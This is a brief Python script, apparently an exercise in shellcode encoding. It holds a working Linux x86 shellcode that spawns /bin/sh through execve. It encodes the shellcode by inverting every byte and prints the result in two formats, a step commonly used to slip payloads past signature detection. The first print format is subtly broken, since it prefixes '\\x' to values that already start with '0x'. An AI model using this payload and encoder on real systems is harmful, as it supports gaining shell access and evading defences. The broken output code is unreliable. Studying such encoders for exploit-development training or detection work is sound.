

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

shellcode = bytearray(shellcode)


res1 = ''
res2 = ''

for i in shellcode:
    temp = ~i
    hexvalue = hex(temp&0xff)
    res1 += '\\x' + hexvalue
    res2 +=  hexvalue +','

print(res1)
print(res2)

